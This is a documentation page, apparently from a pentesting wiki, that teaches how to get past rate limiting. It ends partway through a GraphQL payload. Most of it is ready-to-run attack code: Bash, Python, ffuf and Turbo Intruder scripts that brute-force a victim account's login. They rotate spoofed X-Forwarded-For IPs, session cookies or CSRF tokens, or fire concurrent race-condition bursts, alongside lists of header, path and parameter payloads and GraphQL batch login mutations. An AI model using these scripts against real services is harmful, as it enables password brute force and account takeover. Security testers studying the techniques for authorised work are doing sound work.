---
title: Rate Limit Bypass
description: Complete guide to rate limiting bypass techniques, payloads, header manipulation, request smuggling, IP rotation, and privilege escalation through brute force and abuse.
navigation:
  icon: i-lucide-gauge
  title: Rate Limit Bypass
---

## What is Rate Limiting

Rate limiting is a security mechanism that **restricts the number of requests** a user, IP, or session can make within a defined time window. It protects against brute force attacks, credential stuffing, denial of service, API abuse, and automated scraping. Bypassing rate limits allows attackers to **automate attacks** that should be throttled.

::note
Rate limit bypass is a **foundational skill** in bug bounty and penetration testing. Nearly every high-impact attack — brute force, account takeover, OTP bypass, enumeration — requires defeating rate limiting first. It is rarely a standalone vulnerability but **enables critical exploits** when chained.
::

::card-group
  ::card
  ---
  title: Header Manipulation
  icon: i-lucide-file-code
  ---
  Inject or modify HTTP headers like `X-Forwarded-For`, `X-Real-IP`, and `X-Originating-IP` to **spoof source identity**. Rate limiters trusting these headers reset counters per "unique" IP.
  ::

  ::card
  ---
  title: Endpoint & Request Variation
  icon: i-lucide-shuffle
  ---
  Change URL path casing, add trailing slashes, use path parameters, switch HTTP methods, or alter `Content-Type` to make each request appear **unique** to the limiter.
  ::

  ::card
  ---
  title: Session & Token Rotation
  icon: i-lucide-refresh-cw
  ---
  Rotate session cookies, API keys, CSRF tokens, or authentication tokens between requests. Per-session rate limits reset with each **new session identity**.
  ::

  ::card
  ---
  title: Distributed & Infrastructure
  icon: i-lucide-network
  ---
  Distribute requests across **multiple IPs**, proxy chains, cloud functions, Tor circuits, or use HTTP/2 multiplexing and request smuggling to bypass network-level limits.
  ::

  ::card
  ---
  title: Parameter Pollution
  icon: i-lucide-copy
  ---
  Duplicate parameters, inject null bytes, add whitespace, or use unicode variations to make the rate limiter treat each request as **distinct** while the backend processes them identically.
  ::

  ::card
  ---
  title: Race Conditions
  icon: i-lucide-timer
  ---
  Exploit **time-of-check-to-time-of-use** gaps by sending many requests simultaneously before the counter updates. Single-packet attacks and HTTP/2 desync amplify effectiveness.
  ::
::

---

## Methodology & Thinking

::steps{level="3"}

### Identify Rate Limit Implementation

Before bypassing, understand **how** the rate limit works. What is it tracking? What triggers it? What is the response when triggered?

```txt [Questions to Answer]
1. What triggers the rate limit?
   → Number of requests? Failed logins? API calls?

2. What identifier does it track?
   → IP address? Session/cookie? API key? User account? Fingerprint?

3. What is the limit threshold?
   → 5 requests/minute? 100/hour? 1000/day?

4. What happens when triggered?
   → HTTP 429? 403? Captcha? Temporary ban? Permanent block?

5. Where is it enforced?
   → Application layer? WAF? CDN (Cloudflare/Akamai)? Reverse proxy (Nginx)?
   → API gateway? Load balancer?

6. Does it apply to ALL endpoints?
   → Same limits on /login and /api/data?
   → Different limits for authenticated vs unauthenticated?

7. How does it reset?
   → Fixed time window? Sliding window? Token bucket? Leaky bucket?
```

### Detect the Rate Limit

```bash [Terminal]
# Send rapid requests to trigger the limit
for i in $(seq 1 100); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}')
  echo "Request $i: HTTP $STATUS"
done

# Note when status changes from 200/401 to 429/403
# That reveals the threshold

# Check rate limit headers in response:
curl -s -I "https://target.com/api/endpoint" | grep -iE "(rate|limit|retry|remaining|reset|x-ratelimit)"
```

### Map Rate Limit Headers

```txt [Common Rate Limit Response Headers]
X-RateLimit-Limit: 100          # Maximum requests allowed
X-RateLimit-Remaining: 45       # Requests remaining in window
X-RateLimit-Reset: 1625000000   # Unix timestamp when limit resets
Retry-After: 60                 # Seconds until retry allowed
X-Rate-Limit-Request-Forwarded-For: IP
X-Rate-Limit-Request-Remote-Addr: IP
RateLimit-Limit: 100
RateLimit-Remaining: 45
RateLimit-Reset: 60
X-RateLimit-Used: 55
```

### Test Each Bypass Technique

Apply bypass techniques systematically. Start with the simplest (header manipulation) and escalate to more complex methods (race conditions, HTTP/2 attacks).

### Chain with Impact

A rate limit bypass alone is often **informational**. Chain it with a high-impact attack to demonstrate real risk: OTP brute force, credential stuffing, user enumeration, or data scraping.

::

---

## Header Manipulation

The most common and frequently successful bypass technique. Many rate limiters identify clients by IP address, extracted from HTTP headers set by **reverse proxies, load balancers, and CDNs**.

::tip
If the application sits behind a reverse proxy (Nginx, Apache, HAProxy, AWS ALB, Cloudflare), the backend often trusts headers like `X-Forwarded-For` to determine the client's "real" IP. By injecting arbitrary IPs into these headers, each request appears to come from a **different client**.
::

### IP Spoofing Headers

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Core Headers"}
  ```txt [Payloads]
  # Primary IP spoofing headers
  # Add ONE or MULTIPLE to each request
  # Rotate the IP value with each request

  X-Forwarded-For: 127.0.0.1
  X-Forwarded-For: RANDOM_IP
  X-Real-IP: 127.0.0.1
  X-Real-IP: RANDOM_IP
  X-Originating-IP: 127.0.0.1
  X-Originating-IP: RANDOM_IP
  X-Client-IP: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  X-Remote-Addr: 127.0.0.1
  X-Host: 127.0.0.1
  True-Client-IP: 127.0.0.1
  CF-Connecting-IP: RANDOM_IP
  Fastly-Client-IP: RANDOM_IP
  X-Azure-ClientIP: RANDOM_IP
  X-Azure-SocketIP: RANDOM_IP
  X-Cluster-Client-IP: RANDOM_IP
  X-Forwarded: RANDOM_IP
  Forwarded-For: RANDOM_IP
  Forwarded: for=RANDOM_IP
  Forwarded: for="RANDOM_IP"
  X-Appengine-User-IP: RANDOM_IP
  X-ProxyUser-IP: RANDOM_IP
  X-Original-Forwarded-For: RANDOM_IP
  X-Original-Remote-Addr: RANDOM_IP
  X-Client-Ip: RANDOM_IP
  X-Forwarded-Host: RANDOM_IP
  X-Custom-IP-Authorization: RANDOM_IP
  X-Akamai-Client-IP: RANDOM_IP
  X-Vercel-Forwarded-For: RANDOM_IP
  X-Envoy-External-Address: RANDOM_IP
  X-Ip: RANDOM_IP
  X-Real-Ip: RANDOM_IP
  X-Backend-Host: RANDOM_IP
  X-Originating-Ip: RANDOM_IP
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Rotation Patterns"}
  ```txt [Payloads]
  # Rotate IP per request to get unlimited attempts

  # Sequential rotation:
  X-Forwarded-For: 10.0.0.1      # Request 1
  X-Forwarded-For: 10.0.0.2      # Request 2
  X-Forwarded-For: 10.0.0.3      # Request 3
  ...
  X-Forwarded-For: 10.0.0.254    # Request 254

  # Random private IPs:
  X-Forwarded-For: 192.168.{0-255}.{1-254}
  X-Forwarded-For: 10.{0-255}.{0-255}.{1-254}
  X-Forwarded-For: 172.{16-31}.{0-255}.{1-254}

  # Random public IPs:
  X-Forwarded-For: {1-223}.{0-255}.{0-255}.{1-254}

  # Loopback variations:
  X-Forwarded-For: 127.0.0.1
  X-Forwarded-For: 127.0.0.2
  X-Forwarded-For: 127.0.0.{1-254}
  X-Forwarded-For: 127.{0-255}.{0-255}.{1-254}

  # IPv6:
  X-Forwarded-For: ::1
  X-Forwarded-For: ::ffff:127.0.0.1
  X-Forwarded-For: 2001:db8::RANDOM
  X-Forwarded-For: fe80::RANDOM

  # Multiple IPs in chain:
  X-Forwarded-For: RANDOM_IP, 127.0.0.1
  X-Forwarded-For: RANDOM_IP, ANOTHER_IP, 127.0.0.1
  X-Forwarded-For: 8.8.8.8, RANDOM_IP
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Double Headers"}
  ```txt [Payloads]
  # Send same header TWICE with different values
  # Some parsers take first, some take last

  X-Forwarded-For: ATTACKER_IP
  X-Forwarded-For: RANDOM_IP

  # Or combine different header types:
  X-Forwarded-For: RANDOM_IP_1
  X-Real-IP: RANDOM_IP_2
  X-Client-IP: RANDOM_IP_3
  X-Originating-IP: RANDOM_IP_4
  True-Client-IP: RANDOM_IP_5

  # Forwarded header (RFC 7239):
  Forwarded: for=RANDOM_IP;proto=https;by=127.0.0.1
  Forwarded: for="RANDOM_IP", for="127.0.0.1"
  Forwarded: for=RANDOM_IP;host=target.com

  # Comma-separated in single header:
  X-Forwarded-For: RANDOM_IP_1, RANDOM_IP_2, RANDOM_IP_3
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Burp Suite Match & Replace"}
  ```txt [Burp Configuration]
  # Burp Suite → Proxy → Options → Match and Replace
  # Add these rules to auto-rotate IP on every request:

  Type: Request Header
  Match: ^X-Forwarded-For:.*$
  Replace: X-Forwarded-For: {random_ip}
  Regex: true

  # OR add header if not present:
  Type: Request Header
  Match: (empty)
  Replace: X-Forwarded-For: 10.0.0.{1-254}

  # For Burp Intruder:
  # Add X-Forwarded-For header with Pitchfork attack
  # Position 1: OTP/password payload
  # Position 2: Random IP payload

  # Header in request:
  X-Forwarded-For: §10.0.0.1§

  # Payload set 2: Numbers 1-254
  # Or use "Random IP" generator extension
  ```
  :::
::

### Header Bypass Scripts

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Bash"}
  ```bash [rate_limit_header_bypass.sh]
  #!/bin/bash
  # Rate Limit Bypass via Header Rotation
  # Usage: ./rate_limit_header_bypass.sh

  TARGET="https://target.com/api/login"
  HEADER_NAME="X-Forwarded-For"

  for i in $(seq 1 1000); do
    # Generate random IP
    IP="$((RANDOM%254+1)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%254+1))"
    
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST "$TARGET" \
      -H "Content-Type: application/json" \
      -H "$HEADER_NAME: $IP" \
      -d '{"email":"victim@example.com","password":"attempt_'$i'"}')
    
    echo "[$i] IP: $IP → HTTP $STATUS"
    
    # Check for success
    if [ "$STATUS" = "200" ] || [ "$STATUS" = "302" ]; then
      echo "[+] POSSIBLE SUCCESS at attempt $i!"
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python"}
  ```python [header_bypass.py]
  #!/usr/bin/env python3
  """
  Rate Limit Bypass - Header Rotation
  Tests multiple IP-spoofing headers
  """
  import requests
  import random
  import sys

  TARGET = "https://target.com/api/login"
  
  HEADERS_TO_TEST = [
      "X-Forwarded-For",
      "X-Real-IP",
      "X-Originating-IP",
      "X-Client-IP",
      "X-Remote-IP",
      "X-Remote-Addr",
      "True-Client-IP",
      "CF-Connecting-IP",
      "X-Cluster-Client-IP",
      "Forwarded-For",
      "X-ProxyUser-IP",
      "X-Original-Forwarded-For",
      "X-Azure-ClientIP",
      "Fastly-Client-IP",
      "X-Akamai-Client-IP",
  ]

  def random_ip():
      return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

  def test_single_header(header_name, num_requests=20):
      """Test if a single header bypasses rate limit"""
      print(f"\n[*] Testing header: {header_name}")
      
      success_count = 0
      for i in range(num_requests):
          ip = random_ip()
          headers = {
              "Content-Type": "application/json",
              header_name: ip
          }
          data = {"email": "test@test.com", "password": f"wrong_{i}"}
          
          try:
              resp = requests.post(TARGET, json=data, headers=headers, timeout=10)
              status = resp.status_code
              
              if status != 429 and status != 403:
                  success_count += 1
              
              if i % 5 == 0:
                  print(f"    [{i+1}/{num_requests}] {header_name}: {ip} → {status}")
          except Exception as e:
              print(f"    Error: {e}")
      
      bypassed = success_count == num_requests
      result = "BYPASSED ✓" if bypassed else f"BLOCKED ({success_count}/{num_requests})"
      print(f"    Result: {result}")
      return bypassed

  def test_all_headers():
      """Test all spoofing headers"""
      print(f"[*] Target: {TARGET}")
      print(f"[*] Testing {len(HEADERS_TO_TEST)} headers...")
      
      working = []
      for header in HEADERS_TO_TEST:
          if test_single_header(header):
              working.append(header)
      
      print(f"\n{'='*50}")
      print(f"[+] Working headers ({len(working)}):")
      for h in working:
          print(f"    ✓ {h}")
      if not working:
          print("    None - try other bypass techniques")
      print(f"{'='*50}")

  def test_multi_header(num_requests=50):
      """Test with ALL headers simultaneously"""
      print(f"\n[*] Testing ALL headers simultaneously...")
      
      success = 0
      for i in range(num_requests):
          headers = {"Content-Type": "application/json"}
          ip = random_ip()
          for h in HEADERS_TO_TEST:
              headers[h] = ip
          
          data = {"email": "test@test.com", "password": f"wrong_{i}"}
          
          try:
              resp = requests.post(TARGET, json=data, headers=headers, timeout=10)
              if resp.status_code not in [429, 403]:
                  success += 1
          except:
              pass
      
      print(f"    Result: {success}/{num_requests} requests succeeded")

  if __name__ == "__main__":
      test_all_headers()
      test_multi_header()
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ffuf"}
  ```bash [Terminal]
  # Generate IP wordlist
  python3 -c "
  import random
  for i in range(10000):
      print(f'{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}')
  " > random_ips.txt

  # ffuf with header rotation (Pitchfork mode)
  ffuf -u "https://target.com/api/login" \
    -X POST \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: IPFUZZ" \
    -d '{"email":"victim@example.com","password":"PASSFUZZ"}' \
    -w random_ips.txt:IPFUZZ \
    -w passwords.txt:PASSFUZZ \
    -mode pitchfork \
    -mc 200,302 \
    -t 50 \
    -o results.json

  # With multiple headers
  ffuf -u "https://target.com/api/login" \
    -X POST \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: FUZZ" \
    -H "X-Real-IP: FUZZ" \
    -H "X-Client-IP: FUZZ" \
    -d '{"email":"victim@example.com","password":"password123"}' \
    -w random_ips.txt \
    -mc all \
    -fc 429 \
    -t 100
  ```
  :::
::

---

## Endpoint & URL Manipulation

Make the same request appear as targeting **different endpoints** by varying the URL structure. Rate limiters often track request counts per URL path.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Path Variation"}
  ```txt [Payloads]
  # Original endpoint being rate limited:
  POST /api/login

  # Case variation:
  POST /API/LOGIN
  POST /Api/Login
  POST /api/LOGIN
  POST /api/Login
  POST /Api/login
  POST /API/login

  # Trailing slash:
  POST /api/login/
  POST /api/login//
  POST /api/login///

  # Dot segments:
  POST /api/./login
  POST /api/../api/login
  POST /./api/./login
  POST /../api/login
  POST /api/login/.
  POST /api/login/..
  POST /api/login/./

  # Double slashes:
  POST //api//login
  POST ///api///login
  POST /api//login
  POST //api/login

  # Path parameter injection:
  POST /api/login;
  POST /api/login;.css
  POST /api/login;.js
  POST /api/login;.html
  POST /api;/login
  POST /api/login;bypass=true

  # URL encoding:
  POST /api/%6cogin
  POST /api/%6Cogin
  POST /%61pi/login
  POST /api/l%6Fgin
  POST /%61%70%69/%6c%6f%67%69%6e
  POST /api/login%00
  POST /api/login%0a
  POST /api/login%0d
  POST /api/login%20
  POST /api/login%09
  POST /api/login%23

  # Double URL encoding:
  POST /api/%256cogin
  POST /%2561pi/login

  # Unicode / UTF-8 encoding:
  POST /api/logın     (Turkish dotless i)
  POST /api/ℓogin     (script l)
  POST /api/login﻿    (zero-width no-break space)

  # Wildcard / glob:
  POST /api/logi?
  POST /api/login*

  # Version prefix:
  POST /v1/api/login
  POST /v2/api/login
  POST /v3/api/login
  POST /api/v1/login
  POST /api/v2/login

  # Adding query string:
  POST /api/login?
  POST /api/login?bypass=1
  POST /api/login?_=TIMESTAMP
  POST /api/login?cachebust=RANDOM
  POST /api/login?foo=bar
  POST /api/login#
  POST /api/login#fragment
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="HTTP Method Change"}
  ```txt [Payloads]
  # Original:
  POST /api/login

  # Try different HTTP methods:
  GET /api/login?email=victim&password=pass
  PUT /api/login
  PATCH /api/login
  DELETE /api/login
  OPTIONS /api/login
  HEAD /api/login
  TRACE /api/login

  # Method override headers:
  POST /api/login
  X-HTTP-Method-Override: PUT

  POST /api/login
  X-HTTP-Method: PATCH

  POST /api/login
  X-Method-Override: GET

  # Method override via parameter:
  POST /api/login?_method=PUT
  POST /api/login?_method=PATCH
  POST /api/login?method=PUT

  # CONNECT / custom methods:
  PROPFIND /api/login
  MKCOL /api/login
  COPY /api/login
  MOVE /api/login
  LOCK /api/login
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Content-Type Switch"}
  ```txt [Payloads]
  # Change Content-Type — same data, different format
  # Rate limiter may track per Content-Type

  # Original:
  Content-Type: application/json
  {"email":"victim@example.com","password":"password123"}

  # Switch to form data:
  Content-Type: application/x-www-form-urlencoded
  email=victim%40example.com&password=password123

  # Switch to multipart:
  Content-Type: multipart/form-data; boundary=----boundary
  ------boundary
  Content-Disposition: form-data; name="email"

  victim@example.com
  ------boundary
  Content-Disposition: form-data; name="password"

  password123
  ------boundary--

  # Switch to XML:
  Content-Type: application/xml
  <login><email>victim@example.com</email><password>password123</password></login>

  # Switch to text/plain:
  Content-Type: text/plain
  {"email":"victim@example.com","password":"password123"}

  # No Content-Type:
  (remove Content-Type header entirely)

  # Charset variations:
  Content-Type: application/json; charset=utf-8
  Content-Type: application/json; charset=UTF-8
  Content-Type: application/json; charset=iso-8859-1
  Content-Type: application/json;charset=utf-8
  Content-Type: APPLICATION/JSON
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="API Version Downgrade"}
  ```txt [Payloads]
  # Current API (rate limited):
  POST /api/v2/login
  POST /api/v3/auth/login

  # Try older/alternative versions:
  POST /api/v1/login
  POST /api/v0/login
  POST /api/login            # No version
  POST /v1/login
  POST /v2/login
  POST /api/beta/login
  POST /api/internal/login
  POST /api/legacy/login
  POST /api/old/login
  POST /api/mobile/login     # Mobile API
  POST /api/app/login        # App API
  POST /m-api/login
  POST /mobile/api/login
  POST /rest/login
  POST /graphql              # GraphQL might have different limits

  # GraphQL batch bypass:
  POST /graphql
  [
    {"query":"mutation{login(email:\"victim@example.com\",password:\"pass1\"){token}}"},
    {"query":"mutation{login(email:\"victim@example.com\",password:\"pass2\"){token}}"},
    {"query":"mutation{login(email:\"victim@example.com\",password:\"pass3\"){token}}"}
  ]
  # → Multiple login attempts in SINGLE request
  # → Rate limiter counts as 1 request
  ```
  :::
::

---

## Parameter Pollution & Manipulation

Modify request parameters to make each request appear unique to the rate limiter while the backend processes them identically.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Parameter Duplication"}
  ```txt [Payloads]
  # HTTP Parameter Pollution (HPP)
  # Send same parameter multiple times

  # URL parameters:
  POST /api/login?email=victim@example.com&email=attacker@evil.com
  POST /api/login?email=victim@example.com&password=pass1&password=pass2

  # Body + URL:
  POST /api/login?email=attacker@evil.com
  Body: {"email":"victim@example.com","password":"password123"}

  # Duplicate keys in JSON:
  {"email":"victim@example.com","password":"wrong","email":"victim@example.com","password":"attempt2"}

  # Array injection:
  {"email":"victim@example.com","password":["pass1","pass2","pass3"]}
  {"email":["victim@example.com"],"password":"password123"}

  # Nested parameters:
  {"email":"victim@example.com","password":"pass","extra":{"bypass":true}}

  # Mixed body types:
  email=victim@example.com&password=pass&email=victim@example.com
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Whitespace & Null Bytes"}
  ```txt [Payloads]
  # Add invisible characters to make requests "unique"

  # Space padding (request looks different, processes same):
  {"email":"victim@example.com","password":"password123"}
  {"email":"victim@example.com ","password":"password123"}
  {"email":" victim@example.com","password":"password123"}
  {"email":"victim@example.com","password":"password123 "}
  {"email":"victim@example.com", "password":"password123"}

  # Null bytes:
  {"email":"victim@example.com%00","password":"password123"}
  {"email":"victim@example.com\x00","password":"password123"}
  {"email":"victim@example.com\u0000","password":"password123"}

  # Tab characters:
  {"email":"victim@example.com\t","password":"password123"}
  {"email":"\tvictim@example.com","password":"password123"}

  # Newline characters:
  {"email":"victim@example.com\n","password":"password123"}
  {"email":"victim@example.com\r\n","password":"password123"}

  # Unicode zero-width characters:
  {"email":"victim@example.com\u200b","password":"password123"}   # Zero-width space
  {"email":"victim@example.com\u200c","password":"password123"}   # Zero-width non-joiner
  {"email":"victim@example.com\u200d","password":"password123"}   # Zero-width joiner
  {"email":"victim@example.com\ufeff","password":"password123"}   # BOM

  # Extra random parameters (cache buster):
  {"email":"victim@example.com","password":"pass","_":"1234567890"}
  {"email":"victim@example.com","password":"pass","random":"UNIQUE_VALUE"}
  {"email":"victim@example.com","password":"pass","ts":"TIMESTAMP"}
  {"email":"victim@example.com","password":"pass","nonce":"RANDOM"}
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Email Format Tricks"}
  ```txt [Payloads]
  # If rate limit is per email/username
  # These all deliver to the same mailbox but look "different":

  # Case variation:
  victim@example.com
  Victim@example.com
  VICTIM@example.com
  vIcTiM@example.com
  victim@Example.com
  victim@EXAMPLE.COM

  # Plus addressing (Gmail):
  victim+1@example.com
  victim+2@example.com
  victim+anything@example.com
  victim+bypass@example.com

  # Dot trick (Gmail ignores dots):
  v.ictim@example.com
  vi.ctim@example.com
  vic.tim@example.com
  v.i.c.t.i.m@example.com
  v...ictim@example.com

  # Tag addressing:
  victim+tag1@example.com
  victim+tag2@example.com

  # Subdomain (if mail server accepts):
  victim@mail.example.com
  victim@mx.example.com

  # URL encoding in parameter:
  victim%40example.com
  victim%40example%2ecom

  # Whitespace:
  %20victim@example.com
  victim@example.com%20
  victim@example.com%00
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Username Variation"}
  ```txt [Payloads]
  # If rate limit is per username input (string matching):

  # Case variation:
  admin
  Admin
  ADMIN
  aDmIn

  # Whitespace:
  admin%20
  %20admin
  admin%09
  admin%0a

  # Unicode normalization:
  ⓐdmin          (circled a)
  ａdmin          (fullwidth a)
  аdmin           (Cyrillic а)

  # URL encoding:
  %61dmin         (a = %61)
  admi%6e         (n = %6e)

  # With null bytes:
  admin%00
  admin\x00
  admin\u0000
  ```
  :::
::

---

## Session & Token Rotation

If rate limiting is tied to **session identifiers**, rotating sessions resets the counter.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Session Rotation"}
  ```txt [Attack Flow]
  # Per-session rate limiting bypass:

  STEP 1: Start with session A
  STEP 2: Send requests until rate limited (e.g., 10 requests)
  STEP 3: Get NEW session:
          - Clear cookies and revisit site
          - Call registration/login endpoint for new session
          - Use different cookie jar
  STEP 4: Continue with session B (counter reset)
  STEP 5: Repeat as needed

  # Example:
  # Session A: Try passwords 1-10 → rate limited
  # Session B: Try passwords 11-20 → rate limited
  # Session C: Try passwords 21-30 → rate limited
  # ...unlimited attempts with session rotation
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python Session Rotation"}
  ```python [session_rotate.py]
  #!/usr/bin/env python3
  """
  Rate Limit Bypass via Session Rotation
  """
  import requests

  TARGET_LOGIN = "https://target.com/api/login"
  TARGET_PAGE = "https://target.com/"
  BATCH_SIZE = 10  # Requests before getting new session

  def get_new_session():
      """Get a fresh session cookie"""
      s = requests.Session()
      s.get(TARGET_PAGE, timeout=10)
      return s

  def brute_force(email, passwords):
      session = get_new_session()
      
      for i, password in enumerate(passwords):
          # Rotate session every BATCH_SIZE requests
          if i > 0 and i % BATCH_SIZE == 0:
              print(f"[*] Rotating session at attempt {i}...")
              session = get_new_session()
          
          data = {"email": email, "password": password}
          resp = session.post(TARGET_LOGIN, json=data, timeout=10)
          
          if resp.status_code == 429:
              print(f"[!] Rate limited at {i}, rotating session...")
              session = get_new_session()
              resp = session.post(TARGET_LOGIN, json=data, timeout=10)
          
          if resp.status_code == 200 and "success" in resp.text.lower():
              print(f"[+] VALID PASSWORD: {password}")
              return password
          
          if i % 10 == 0:
              print(f"[*] Attempt {i}: {password} → {resp.status_code}")
      
      return None

  with open("passwords.txt") as f:
      passwords = [line.strip() for line in f]

  brute_force("victim@example.com", passwords)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="CSRF Token Rotation"}
  ```txt [Attack Flow]
  # If rate limit is per CSRF token:

  STEP 1: Request login page → Get CSRF token A
  STEP 2: Submit login with CSRF token A → Request counted
  STEP 3: Request login page AGAIN → Get new CSRF token B
  STEP 4: Submit login with CSRF token B → Counter reset!

  # Each page load generates a new CSRF token
  # Each token may have its own rate limit counter

  # Implementation:
  for each password_attempt:
      1. GET /login → extract CSRF token from HTML/response
      2. POST /login with new CSRF token + password attempt
      3. Repeat (new token = new counter)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Cookie Manipulation"}
  ```txt [Payloads]
  # Modify cookies that might be used for rate tracking

  # Remove rate limit cookies:
  # Look for cookies like:
  _rate_limit=TOKEN
  _rl_session=TOKEN
  rate_limit_counter=5
  request_count=10
  rl_token=abc123
  throttle_key=xyz

  # Delete these cookies between requests
  # Or set them to 0/empty:
  Cookie: rate_limit_counter=0
  Cookie: request_count=0

  # Generate new tracking cookie:
  # If cookie is UUID-based, generate new UUID each request
  Cookie: session=NEW_RANDOM_UUID

  # If cookie is timestamp-based:
  Cookie: _rl=NEW_TIMESTAMP

  # Remove ALL cookies:
  # Send request with no Cookie header at all
  ```
  :::
::

---

## Race Conditions

Exploit the time gap between **checking the rate limit counter** and **incrementing it**. By sending many requests simultaneously, they all pass the check before any increment occurs.

::caution
Race conditions are among the **most powerful** rate limit bypass techniques. They work even against well-implemented server-side rate limiters if the counter update is not atomic.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Turbo Intruder (Burp)"}
  ```python [race_ratelimit.py]
  # Burp Suite Turbo Intruder
  # Send all requests simultaneously using gate mechanism

  def queueRequests(target, wordlists):
      engine = RequestEngine(
          endpoint=target.endpoint,
          concurrentConnections=1,     # Single connection
          requestsPerConnection=1000,  # Pipeline many requests
          pipeline=True
      )
      
      # Queue all requests but HOLD them
      for word in open('/path/to/passwords.txt'):
          engine.queue(
              target.req,
              word.strip(),
              gate='race'  # Hold at gate
          )
      
      # Release ALL requests simultaneously
      engine.openGate('race')

  def handleResponse(req, interesting):
      # Flag non-rate-limited responses
      if req.status != 429:
          table.add(req)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Single Packet Attack"}
  ```python [single_packet.py]
  # HTTP/2 Single Packet Attack
  # Pack multiple requests into a single TCP packet
  # All requests arrive at the server at EXACTLY the same time

  # Using Turbo Intruder with HTTP/2:
  def queueRequests(target, wordlists):
      engine = RequestEngine(
          endpoint=target.endpoint,
          concurrentConnections=1,
          requestsPerConnection=100,
          pipeline=False,
          engine=Engine.HTTP2  # Use HTTP/2
      )
      
      passwords = open('/path/to/passwords.txt').readlines()
      
      for i, pwd in enumerate(passwords):
          engine.queue(
              target.req,
              pwd.strip(),
              gate='race'
          )
      
      # All queued requests sent in single packet burst
      engine.openGate('race')

  def handleResponse(req, interesting):
      if req.status != 429 and '{"success":true' in req.response:
          table.add(req)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python asyncio"}
  ```python [async_race.py]
  #!/usr/bin/env python3
  """
  Race Condition Rate Limit Bypass
  Sends N requests simultaneously using asyncio
  """
  import asyncio
  import aiohttp
  import time

  TARGET = "https://target.com/api/login"
  CONCURRENT = 100  # Number of simultaneous requests

  async def send_request(session, password, idx):
      headers = {"Content-Type": "application/json"}
      data = {"email": "victim@example.com", "password": password}
      
      try:
          async with session.post(TARGET, json=data, headers=headers, timeout=10) as resp:
              status = resp.status
              text = await resp.text()
              if status != 429:
                  print(f"  [{idx}] {password} → {status} ({len(text)} bytes)")
              if status == 200 and "success" in text.lower():
                  print(f"\n[+] FOUND: {password}")
              return status
      except Exception as e:
          return 0

  async def race_batch(passwords):
      """Send all passwords in one simultaneous burst"""
      connector = aiohttp.TCPConnector(limit=CONCURRENT, force_close=True)
      async with aiohttp.ClientSession(connector=connector) as session:
          tasks = [
              send_request(session, pwd, i) 
              for i, pwd in enumerate(passwords)
          ]
          # asyncio.gather fires all coroutines concurrently
          results = await asyncio.gather(*tasks)
          
          rate_limited = results.count(429)
          passed = len(results) - rate_limited
          print(f"\n[*] Batch: {passed}/{len(results)} passed, {rate_limited} rate limited")

  def main():
      with open("passwords.txt") as f:
          all_passwords = [line.strip() for line in f]
      
      # Process in batches
      batch_size = CONCURRENT
      for i in range(0, len(all_passwords), batch_size):
          batch = all_passwords[i:i+batch_size]
          print(f"\n[*] Sending batch {i//batch_size + 1} ({len(batch)} requests simultaneously)...")
          asyncio.run(race_batch(batch))
          time.sleep(0.1)  # Brief pause between batches

  if __name__ == "__main__":
      main()
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="curl Parallel"}
  ```bash [Terminal]
  # Send many requests simultaneously using background processes

  # Parallel curl requests:
  for i in $(seq 1 100); do
    curl -s -o /dev/null -w "[$i] %{http_code}\n" \
      -X POST "https://target.com/api/login" \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"victim@example.com\",\"password\":\"attempt_$i\"}" &
  done
  wait

  # Using GNU parallel:
  seq 1 1000 | parallel -j 100 \
    "curl -s -o /dev/null -w '[{}] %{http_code}\n' \
    -X POST 'https://target.com/api/login' \
    -H 'Content-Type: application/json' \
    -d '{\"email\":\"victim@example.com\",\"password\":\"pass_{}\"}'"

  # Using xargs:
  seq 1 100 | xargs -P 100 -I {} \
    curl -s -o /dev/null -w "[{}] %{http_code}\n" \
    -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com","password":"pass_{}"}'
  ```
  :::
::

---

## GraphQL Batch / Array Bypass

GraphQL APIs often allow **batching multiple operations** in a single HTTP request. The rate limiter sees **1 request**, but the server processes **hundreds of operations**.

```txt [Payloads]
# Single request, multiple login attempts:

POST /graphql
Content-Type: application/json

# Array of queries (batch):
[
  {"query":"mutation{login(email:\"victim@example.com\",password:\"pass1\"){token}}"},
  {"query":"mutation{login(email:\"victim@example.com\",password:\"pass2\"){token}}"},
  {"query":"mutation{login(email:\"victim@example.com\",password:\"pass3\"){token}}"},
  {"query":"mutation{login(email:\"victim@example.com\",password:\"pass4\"){token}}"},
  {"query":"mutation{login(email:\"victim@example.com\",password:\"pass5\"){token}}"}
]

# Aliased queries (single request body):
POST /graphql
{
  "query": "mutation {
